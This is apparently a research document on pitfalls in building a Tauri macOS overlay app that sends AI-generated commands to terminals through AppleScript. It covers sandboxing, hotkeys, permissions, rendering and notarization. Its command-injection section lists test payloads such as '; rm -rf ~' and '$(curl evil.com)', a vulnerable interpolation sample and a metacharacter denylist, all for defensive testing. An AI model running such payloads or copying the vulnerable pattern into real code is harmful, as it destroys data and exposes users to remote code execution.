# Domain Pitfalls: Tauri macOS Overlay App with Terminal Integration

**Domain:** macOS overlay application with global hotkeys and terminal automation
**Researched:** February 21, 2026
**Confidence:** HIGH (verified with official Tauri documentation, Apple security guidelines, and GitHub issue tracker)

## Critical Pitfalls

Mistakes that cause rewrites, security vulnerabilities, or major functional issues.

### Pitfall 1: Sandboxing Incompatible with Accessibility API

**What goes wrong:** You cannot use the macOS Accessibility API from a sandboxed app. If you enable sandboxing (required for App Store distribution), your app will be unable to read terminal state or interact with other applications, even after users grant permissions.

**Why it happens:** Apple's sandbox explicitly blocks inter-application accessibility features. Developers assume that user-granted permissions override sandbox restrictions, but they don't.

**Consequences:**
- Terminal state reading fails silently
- Unable to detect active terminal app
- Cannot paste commands into third-party terminals
- App Store distribution becomes impossible without removing core features
- If discovered late, requires complete rewrite of distribution strategy

**Prevention:**
- DO NOT enable `com.apple.security.app-sandbox` entitlement
- Plan for Developer ID distribution (notarization only, not App Store)
- Document in tauri.conf.json why sandboxing is disabled
- Add entitlements file with required accessibility permissions:
  ```xml
  <key>com.apple.security.automation.apple-events</key>
  <true/>
  ```

**Detection:**
- Test accessibility features immediately after enabling sandboxing
- Check for "Operation not permitted" errors in accessibility API calls
- Verify with `tauri-plugin-macos-permissions` before building release

**Phase to address:** Phase 1 (Foundation) - This decision affects architecture and distribution from day one.

**Sources:**
- [Apple Developer Forums: Accessibility permission not granted for sandboxed macOS apps](https://developer.apple.com/forums/thread/810677)
- [Tauri macOS Application Bundle Documentation](https://v2.tauri.app/distribute/macos-application-bundle/)

---

### Pitfall 2: AppleScript Command Injection via Unsanitized xAI Responses

**What goes wrong:** Streaming xAI API responses may contain backticks, semicolons, or other shell metacharacters. When these are inserted into AppleScript `do script` commands without sanitization, attackers can execute arbitrary terminal commands.

**Why it happens:** Developers trust AI-generated content as "safe" because it comes from an API, not direct user input. AppleScript string escaping is non-obvious (requires backslash escaping of quotes, but also handling of special characters).

**Consequences:**
- Remote code execution vulnerability
- Malicious prompts can inject `; rm -rf ~` or credential-stealing commands
- Affects all users who trigger malicious AI responses
- Potential for data exfiltration via injected `curl` commands
- Reputation damage and security disclosure requirements

**Prevention:**

1. **NEVER directly interpolate AI responses into AppleScript:**
   ```applescript
   # VULNERABLE - DO NOT DO THIS
   tell application "iTerm2"
       do script "echo " & aiResponse
   end tell
   ```

2. **Use proper escaping for AppleScript strings:**
   ```rust
   fn escape_applescript(s: &str) -> String {
       s.replace("\\", "\\\\")
        .replace("\"", "\\\"")
        .replace("\n", "\\n")
        .replace("\r", "\\r")
   }
   ```

3. **Whitelist safe characters and reject dangerous ones:**
   ```rust
   fn sanitize_command(cmd: &str) -> Result<String, &'static str> {
       if cmd.contains(&['`', '$', ';', '&', '|', '>', '<', '\n'][..]) {
           return Err("Command contains dangerous characters");
       }
       Ok(cmd.to_string())
   }
   ```

4. **Use base64 encoding for complex commands:**
   ```applescript
   tell application "Terminal"
       do script "echo " & quoted form of (do shell script "echo '" & base64EncodedCommand & "' | base64 -d")
   end tell
   ```

5. **Prefer writing to temp files over inline execution:**
   ```rust
   use std::fs;
   use tempfile::NamedTempFile;

   let temp = NamedTempFile::new()?;
   fs::write(&temp, ai_response)?;
   let path = temp.path().display();
   // AppleScript executes the file, not inline string
   ```

**Detection:**
- Manual code review of all AppleScript string interpolation
- Automated tests with payloads: `"; rm -rf test_dir"`, `` `whoami` ``, `$(curl evil.com)`
- Security audit before public release
- Consider bug bounty program post-launch

**Phase to address:** Phase 2 (Terminal Integration) - Must be solved before any AI-to-terminal command flow is implemented.

**Sources:**
- [Apple Shell Script Security Documentation](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/ShellScriptSecurity/ShellScriptSecurity.html)
- [ClickFix macOS Campaign: AppleScript Terminal Phishing](https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing)
- [MITRE ATT&CK: AppleScript Command and Scripting](https://attack.mitre.org/techniques/T1059/002/)

---

### Pitfall 3: Transparent Window Rendering Glitches on macOS Sonoma with Focus Changes

**What goes wrong:** On macOS Sonoma (14.0+), transparent Tauri windows exhibit visual artifacts (broken shadows, incorrect borders) after losing and regaining focus. This is caused by Stage Manager's rendering changes and affects ALL transparent windows in Tauri v2.

**Why it happens:** macOS Sonoma introduced breaking changes to window compositing APIs for Stage Manager. Tauri's transparent window implementation hasn't fully adapted to these changes.

**Consequences:**
- Overlay window looks broken/unprofessional after Cmd+Tab
- Shadow artifacts persist across window movements
- Users perceive app as buggy or low-quality
- No fix available in Tauri v2.0 as of February 2026

**Prevention:**

1. **Set activation policy to Accessory (recommended):**
   ```rust
   #[cfg(target_os = "macos")]
   use tauri::ActivationPolicy;

   fn main() {
       tauri::Builder::default()
           .setup(|app| {
               #[cfg(target_os = "macos")]
               app.set_activation_policy(ActivationPolicy::Accessory);
               Ok(())
           })
           .run(tauri::generate_context!())
           .expect("error while running tauri application");
   }
   ```

   **Trade-off:** App won't appear in Dock or Cmd+Tab switcher (acceptable for menu bar overlay apps)

2. **Alternative: Disable Stage Manager in documentation:**
   - Include user documentation recommending Stage Manager be disabled
   - Not ideal: users shouldn't need to change OS settings

3. **Monitor Tauri GitHub issues:**
   - Track [Issue #8255](https://github.com/tauri-apps/tauri/issues/8255)
   - Test each Tauri v2.x update for fix
   - Consider contributing upstream fix if resources allow

**Detection:**
- Test on macOS Sonoma 14.0+ with Stage Manager enabled
- Automated screenshot comparison tests on focus change
- User acceptance testing with transparency enabled

**Phase to address:** Phase 1 (Foundation) - Architecture decision affects window behavior from the start.

**Sources:**
- [Tauri Issue #8255: Transparent window glitch on macOS Sonoma after focus change](https://github.com/tauri-apps/tauri/issues/8255)
- [Tauri Window Customization Documentation](https://v2.tauri.app/learn/window-customization/)

---

### Pitfall 4: Global Hotkey Cmd+K Conflicts with System and Third-Party Apps

**What goes wrong:** Cmd+K is used by many macOS apps and system features. Your global hotkey may:
- Fail to register (silently)
- Override user's preferred app shortcuts
- Be blocked by apps like Safari (Cmd+K = search), VS Code (Cmd+K = command palette), Slack (Cmd+K = quick switcher)
- Work inconsistently depending on active app

**Why it happens:** macOS gives priority to focused app shortcuts. Global shortcuts only fire if no app claims the key combination. Tauri's global-shortcut plugin doesn't notify you when registration fails due to conflicts.

**Consequences:**
- Users expect Cmd+K but it doesn't work in their primary workflow app
- Support burden: "why doesn't it work in X app?"
- User frustration and uninstalls
- No error message to user explaining the conflict

**Prevention:**

1. **Allow user-configurable hotkey:**
   ```rust
   use tauri_plugin_global_shortcut::{GlobalShortcutExt, Shortcut};

   fn register_hotkey(app: &tauri::AppHandle, shortcut_str: &str) -> Result<(), String> {
       let shortcut = shortcut_str.parse::<Shortcut>()
           .map_err(|e| format!("Invalid shortcut: {}", e))?;

       app.global_shortcut().register(shortcut)
           .map_err(|e| format!("Failed to register: {}", e))?;

       Ok(())
   }
   ```

2. **Provide alternative defaults:**
   - Primary: `Cmd+K`
   - Fallback 1: `Cmd+Shift+K`
   - Fallback 2: `Cmd+Option+K`
   - Test all three at startup, use first successful

3. **Detect registration failures and notify user:**
   ```rust
   match app.global_shortcut().register(shortcut) {
       Ok(_) => println!("Hotkey registered successfully"),
       Err(e) => {
           // Show user dialog with conflict resolution
           show_hotkey_conflict_dialog(app, &e.to_string());
       }
   }
   ```

4. **Document known conflicts:**
   - Safari: Cmd+K (search bar)
   - VS Code: Cmd+K (command palette trigger)
   - Slack: Cmd+K (quick switcher)
   - Spotlight: Cmd+Space (alternative users might prefer)

5. **Consider double-tap modifier (Cmd Cmd) or unique combo:**
   - Example: `Cmd+Ctrl+K` has fewer conflicts
   - Trade-off: harder to type

**Detection:**
- Test registration on clean macOS with popular apps installed
- Check Tauri global-shortcut registration return value
- User testing across different app configurations
- Monitor support requests for "hotkey not working"

**Phase to address:** Phase 1 (Foundation) - Hotkey architecture must support configuration from start.

**Sources:**
- [Tauri Global Shortcut Plugin Documentation](https://v2.tauri.app/plugin/global-shortcut/)
- [Tauri Issue #10025: Global shortcut event fires twice on macOS](https://github.com/tauri-apps/tauri/issues/10025)
- [Apple Support: Change conflicting keyboard shortcuts](https://support.apple.com/guide/mac-help/change-a-conflicting-keyboard-shortcut-on-mac-mchlp2864/mac)

---

### Pitfall 5: Accessibility Permissions Silently Fail Without Prompting User

**What goes wrong:** macOS Accessibility API requires explicit user permission via System Settings. If permission isn't granted, API calls fail silently with generic errors. Unlike other permissions, accessibility doesn't show an automatic prompt—users must manually navigate to System Settings > Privacy & Security > Accessibility.

**Why it happens:** Apple considers accessibility a high-risk permission (can read all screen content, control other apps). They intentionally made it harder to grant to prevent social engineering attacks.

**Consequences:**
- App appears broken: "why can't it read my terminal?"
- Users don't know they need to grant permission
- Support burden explaining manual permission flow
- Debugging false positives (permission granted but stale TCC database)
- Permission can spontaneously revoke between OS boots (Ventura bug)

**Prevention:**

1. **Use tauri-plugin-macos-permissions to detect and guide:**
   ```rust
   use tauri_plugin_macos_permissions::{PermissionState, MacOSPermissions};

   #[tauri::command]
   async fn check_accessibility() -> Result<bool, String> {
       let perms = MacOSPermissions::new();

       match perms.accessibility().check() {
           PermissionState::Granted => Ok(true),
           PermissionState::Denied | PermissionState::Unknown => {
               // Open System Settings for user
               perms.accessibility().request();
               Ok(false)
           }
       }
   }
   ```

2. **First-run onboarding flow:**
   - Detect missing permission on app launch
   - Show UI explaining why permission is needed
   - Button to open System Settings > Privacy & Security > Accessibility
   - Visual guide with screenshots showing toggle location
   - Verify permission granted before continuing

3. **Handle permission revocation gracefully:**
   ```rust
   // Check permission before each sensitive operation
   fn read_terminal_state() -> Result<TerminalState, Error> {
       if !has_accessibility_permission() {
           return Err(Error::PermissionRequired(
               "Please enable Accessibility in System Settings"
           ));
       }
       // ... proceed with API call
   }
   ```

4. **Add entitlements for Apple Events:**
   ```xml
   <!-- src-tauri/entitlements.plist -->
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
   <plist version="1.0">
   <dict>
       <key>com.apple.security.automation.apple-events</key>
       <true/>
   </dict>
   </plist>
   ```

5. **Test TCC database corruption:**
   - After granting permission, reboot and verify it persists
   - If permission disappears, guide user to reset TCC database:
     ```bash
     tccutil reset Accessibility com.yourapp.bundle.id
     ```

**Detection:**
- Test on fresh macOS install without pre-granted permissions
- Automated UI tests that verify permission prompt flow
- Error logging for accessibility API failures
- User feedback channels for permission issues

**Phase to address:** Phase 1 (Foundation) - Permission flow is part of core UX.

**Sources:**
- [GitHub: tauri-plugin-macos-permissions](https://github.com/ayangweb/tauri-plugin-macos-permissions)
- [Apple Support: Allow accessibility apps to access your Mac](https://support.apple.com/guide/mac-help/allow-accessibility-apps-to-access-your-mac-mh43185/mac)
- [Apple Developer Forums: Accessibility Permissions on sandboxed macOS apps](https://developer.apple.com/forums/thread/810677)

---

## Moderate Pitfalls

Mistakes that cause delays, technical debt, or degraded UX.

### Pitfall 6: Window Cannot Be Dragged with Overlay Title Bar Style

**What goes wrong:** When `titleBarStyle: "Overlay"` is set in tauri.conf.json, the window cannot be moved by dragging. This is a known Tauri v2 issue on macOS.

**Why it happens:** Overlay style removes the standard macOS title bar drag region. Tauri requires explicit `data-tauri-drag-region` attribute to enable dragging, but this isn't clearly documented.

**Prevention:**
- Add `data-tauri-drag-region` attribute to a titlebar div:
  ```html
  <div data-tauri-drag-region class="titlebar">
    <!-- Your titlebar content -->
  </div>
  ```
- Style the drag region to cover desired draggable area:
  ```css
  .titlebar {
    height: 40px;
    background: transparent;
    -webkit-app-region: drag; /* Also needed for webview */
  }
  ```
- Add permission to tauri.conf.json:
  ```json
  {
    "permissions": ["window:allow-start-dragging"]
  }
  ```

**Detection:**
- Manual testing: try to drag window immediately after implementing overlay style
- Automated UI tests for drag functionality

**Sources:**
- [Tauri Issue #9503: Cannot drag window on macOS with Overlay titleBarStyle](https://github.com/tauri-apps/tauri/issues/9503)
- [Tauri Window Customization Documentation](https://v2.tauri.app/learn/window-customization/)

---

### Pitfall 7: Non-Focusable Windows Still Steal Focus on macOS

**What goes wrong:** Setting `"focusable": false` in window configuration doesn't prevent the window from stealing focus when clicked on macOS. This is a Tauri v2 bug reported in August 2025, still present as of February 2026.

**Why it happens:** Tauri's window configuration doesn't properly translate to macOS NSPanel or NSWindow focus behavior.

**Prevention:**
- Assume `focusable: false` doesn't work on macOS
- Use alternative approach: NSPanel window type (requires custom Rust implementation)
- Implement workaround: restore focus to previous window after interaction
  ```rust
  #[tauri::command]
  fn restore_previous_focus(window: tauri::Window) {
      // Store previous active window before showing overlay
      // Restore it after command insertion
  }
  ```
- Track [Tauri Issue #13034](https://github.com/tauri-apps/tauri/issues/13034) requesting NSPanel support

**Detection:**
- Test with background app focused, click overlay, check if background app loses focus
- User acceptance testing for focus interruption

**Sources:**
- [Tauri Issue #14102: Window focusable: false broken on macOS](https://github.com/tauri-apps/tauri/issues/14102)
- [Tauri Issue #13034: Feature request for NSPanel window type](https://github.com/tauri-apps/tauri/issues/13034)

---

### Pitfall 8: Notarization Hangs or Fails Without Clear Error Messages

**What goes wrong:** The `tauri build` notarization step can hang for hours or fail with cryptic errors. Common causes:
- Apple notarization server congestion
- Invalid App Store Connect API key
- Wrong Apple ID credentials
- Missing entitlements
- External binaries not properly signed

**Why it happens:** Notarization is an asynchronous Apple service. Tauri's progress reporting is limited when waiting for Apple's servers.

**Prevention:**
1. **Use App Store Connect API instead of Apple ID:**
   - More reliable than app-specific passwords
   - No 2FA interruptions
   - Better for CI/CD

2. **Set reasonable timeout:**
   ```json
   // tauri.conf.json
   {
     "bundle": {
       "macOS": {
         "notarize": {
           "timeout": 300  // 5 minutes, not default 1 hour
         }
       }
     }
   }
   ```

3. **Test notarization credentials before release build:**
   ```bash
   # Validate credentials
   xcrun notarytool store-credentials --help
   ```

4. **Sign external binaries separately:**
   - If bundling CLI tools or helpers, sign them first
   - Add to tauri.conf.json `externalBin` array
   - Verify signatures: `codesign -vvv --deep --strict <binary>`

**Detection:**
- Build dry-run before release deadline
- Monitor notarization time (>10 min = potential issue)
- Check Apple notarization status page for service disruptions

**Sources:**
- [Tauri macOS Code Signing Documentation](https://v2.tauri.app/distribute/sign/macos/)
- [Tauri Issue #11992: Codesigning and notarization with ExternalBin](https://github.com/tauri-apps/tauri/issues/11992)
- [Tauri Discussion #8630: Notarization stuck for hours](https://github.com/orgs/tauri-apps/discussions/8630)

---

### Pitfall 9: Streaming xAI Responses Cause IPC Performance Bottleneck

**What goes wrong:** Tauri's IPC channel serializes all messages to JSON. Streaming large AI responses (multiple KB per chunk) through Tauri commands causes:
- UI lag and stuttering
- High CPU usage in WebView process
- Memory spikes from buffered JSON strings
- Potential message loss if chunks arrive faster than serialization

**Why it happens:** Tauri v2's IPC is optimized for small, infrequent messages. Streaming large data chunks bypasses this design assumption.

**Prevention:**

1. **Use chunked streaming with backpressure:**
   ```rust
   use tauri::ipc::Response;

   #[tauri::command]
   async fn stream_ai_response(window: tauri::Window) {
       let mut stream = xai_client.stream_completion().await;

       while let Some(chunk) = stream.next().await {
           // Emit small chunks, not full responses
           window.emit("ai-chunk", chunk).unwrap();

           // Backpressure: wait for frontend acknowledgment
           tokio::time::sleep(Duration::from_millis(10)).await;
       }
   }
   ```

2. **Use Tauri events instead of command return values:**
   ```typescript
   // Frontend
   import { listen } from '@tauri-apps/api/event';

   await listen('ai-chunk', (event) => {
       appendToUI(event.payload);
   });

   await invoke('start_streaming');  // Returns immediately
   ```

3. **Consider alternative: WebSocket for high-throughput streaming:**
   ```rust
   // Rust backend with tokio-tungstenite
   // Frontend connects via WebSocket for zero-copy streaming
   // Falls back to IPC if WebSocket unavailable
   ```

4. **Buffer and batch on backend:**
   ```rust
   let mut buffer = String::new();
   while let Some(chunk) = stream.next().await {
       buffer.push_str(&chunk);

       if buffer.len() > 1024 || stream.is_done() {
           window.emit("ai-chunk", &buffer)?;
           buffer.clear();
       }
   }
   ```

5. **Use `tauri::ipc::Response` for large payloads:**
   ```rust
   use tauri::ipc::{Response, InvokeBody};

   #[tauri::command]
   fn get_large_data() -> Response {
       Response::new(/* optimized binary transfer */)
   }
   ```

**Detection:**
- Performance profiling during streaming
- Monitor WebView CPU usage with Activity Monitor
- Test with high-latency network (simulated slow API)
- User testing on older MacBooks (pre-M1)

**Sources:**
- [Tauri Discussion #3138: Streaming response body](https://github.com/orgs/tauri-apps/discussions/3138)
- [Tauri Issue #4197: Transfer rate from backend very slow](https://github.com/tauri-apps/tauri/issues/4197)
- [Tauri Calling Rust Documentation](https://v2.tauri.app/develop/calling-rust/)

---

## Minor Pitfalls

Mistakes that cause annoyance but are fixable without major refactoring.

### Pitfall 10: Terminal App Detection Fails for New/Unknown Terminals

**What goes wrong:** Hardcoding terminal app detection for iTerm2, Terminal.app, Warp, etc. fails when users adopt new terminals or use niche apps.

**Prevention:**
- Use process-based detection instead of app name hardcoding:
  ```rust
  use sysinfo::{System, SystemExt, ProcessExt};

  fn detect_active_terminal() -> Option<String> {
      let s = System::new_all();

      // Check for common shell parent processes
      for process in s.processes().values() {
          let name = process.name();
          if name.contains("bash") || name.contains("zsh") || name.contains("fish") {
              return process.parent().map(|p| p.name().to_string());
          }
      }
      None
  }
  ```
- Allow user to manually select terminal app in settings
- Use AppleScript to query frontmost application:
  ```applescript
  tell application "System Events"
      set frontApp to name of first application process whose frontmost is true
  end tell
  ```

**Detection:**
- Test with multiple terminal apps
- Community feedback for unsupported terminals

---

### Pitfall 11: Menu Bar Icon Rendering Issues on Retina Displays

**What goes wrong:** Menu bar icons appear blurry on retina displays if only 1x PNG is provided. macOS expects @2x and @3x variants.

**Prevention:**
- Provide multi-resolution icons:
  ```
  icons/
    icon.png        # 16x16
    icon@2x.png     # 32x32
    icon@3x.png     # 48x48 (for future displays)
  ```
- Use SF Symbols for native macOS appearance:
  ```rust
  #[cfg(target_os = "macos")]
  use tauri::menu::{MenuBuilder, SystemTrayMenuBuilder};

  SystemTrayMenuBuilder::new()
      .icon_template("icon_template.png")  // Template rendering
      .build();
  ```
- Configure in tauri.conf.json:
  ```json
  {
    "bundle": {
      "icon": [
        "icons/icon.png",
        "icons/icon@2x.png"
      ]
    }
  }
  ```

**Detection:**
- Test on multiple display resolutions
- Check icon sharpness at 200% and 300% scaling

**Sources:**
- [Tauri macOS Application Bundle Documentation](https://v2.tauri.app/distribute/macos-application-bundle/)

---

### Pitfall 12: Global Shortcut Fires Twice on macOS

**What goes wrong:** Tauri's global-shortcut plugin has a reported bug where hotkeys trigger twice per keypress on macOS. This is documented in Issue #10025.

**Prevention:**
- Debounce handler on frontend:
  ```typescript
  let lastTrigger = 0;
  const DEBOUNCE_MS = 100;

  globalShortcut.register('Cmd+K', () => {
      const now = Date.now();
      if (now - lastTrigger < DEBOUNCE_MS) return;
      lastTrigger = now;

      showOverlay();
  });
  ```
- Track issue for upstream fix: [#10025](https://github.com/tauri-apps/tauri/issues/10025)

**Detection:**
- Log hotkey events and check for duplicates
- User testing for double-activation behavior

**Sources:**
- [Tauri Issue #10025: Global shortcut event fires twice on macOS](https://github.com/tauri-apps/tauri/issues/10025)

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| Phase 1: Window Setup | Transparent window glitches on focus change | Set activation policy to Accessory immediately |
| Phase 1: Hotkey Registration | Cmd+K conflicts with popular apps | Build configurable hotkey system from start |
| Phase 1: Permissions | Accessibility permission flow unclear to users | Create onboarding wizard with permission guide |
| Phase 2: Terminal Detection | Hardcoded terminal app list | Use process-based detection + user override |
| Phase 2: AppleScript Integration | Command injection from AI responses | Implement sanitization before any terminal execution |
| Phase 3: xAI Streaming | IPC performance bottleneck | Use Tauri events with chunked streaming |
| Phase 4: Distribution | Notarization hangs or fails | Use App Store Connect API, test early |
| Phase 4: Distribution | Sandboxing breaks accessibility | DO NOT enable sandboxing, use Developer ID |

---

## macOS Version-Specific Issues

| macOS Version | Known Issue | Impact | Workaround |
|---------------|-------------|--------|------------|
| Sonoma 14.0+ | Transparent window rendering glitches with Stage Manager | Critical | Set ActivationPolicy::Accessory |
| Ventura 13.0+ | Accessibility permissions spontaneously revoke between boots | Moderate | Detect and re-prompt on each launch |
| Monterey 12.0+ | Global shortcuts may fail silently | Moderate | Verify registration success, provide fallback |

---

## Distribution Checklist

Before releasing:

- [ ] Accessibility permissions granted during testing (manually in System Settings)
- [ ] Sandboxing is DISABLED (confirmed in entitlements.plist)
- [ ] Entitlements include `com.apple.security.automation.apple-events`
- [ ] All AppleScript string interpolation sanitized
- [ ] Global hotkey conflicts tested with Safari, VS Code, Slack
- [ ] Transparent window tested on Sonoma with Stage Manager enabled
- [ ] Activation policy set to Accessory (if menu bar app)
- [ ] Menu bar icons include @2x and @3x variants
- [ ] Notarization tested with actual Apple credentials (not dry-run)
- [ ] Security audit completed for command injection vectors
- [ ] IPC streaming performance tested with large AI responses
- [ ] Terminal detection tested with iTerm2, Warp, Terminal.app minimum

---

## Sources

**Official Documentation:**
- [Tauri v2 Documentation](https://v2.tauri.app/)
- [Tauri macOS Code Signing](https://v2.tauri.app/distribute/sign/macos/)
- [Tauri Window Customization](https://v2.tauri.app/learn/window-customization/)
- [Tauri Global Shortcut Plugin](https://v2.tauri.app/plugin/global-shortcut/)
- [Apple Shell Script Security](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/ShellScriptSecurity/ShellScriptSecurity.html)
- [Apple Support: Accessibility Permissions](https://support.apple.com/guide/mac-help/allow-accessibility-apps-to-access-your-mac-mh43185/mac)

**Tauri GitHub Issues:**
- [Issue #8255: Transparent window glitch on macOS Sonoma](https://github.com/tauri-apps/tauri/issues/8255)
- [Issue #9503: Cannot drag window with Overlay titleBarStyle](https://github.com/tauri-apps/tauri/issues/9503)
- [Issue #14102: Focusable: false broken on macOS](https://github.com/tauri-apps/tauri/issues/14102)
- [Issue #10025: Global shortcut fires twice on macOS](https://github.com/tauri-apps/tauri/issues/10025)
- [Issue #13034: NSPanel window type feature request](https://github.com/tauri-apps/tauri/issues/13034)
- [Discussion #3138: Streaming response body](https://github.com/orgs/tauri-apps/discussions/3138)

**Security Research:**
- [ClickFix macOS Campaign: AppleScript Phishing](https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing)
- [MITRE ATT&CK: AppleScript T1059.002](https://attack.mitre.org/techniques/T1059/002/)
- [Intego: Matryoshka ClickFix Variant](https://www.intego.com/mac-security-blog/matryoshka-clickfix-macos-stealer/)

**Community Resources:**
- [GitHub: tauri-plugin-macos-permissions](https://github.com/ayangweb/tauri-plugin-macos-permissions)
- [Apple Developer Forums: Sandboxed Accessibility](https://developer.apple.com/forums/thread/810677)
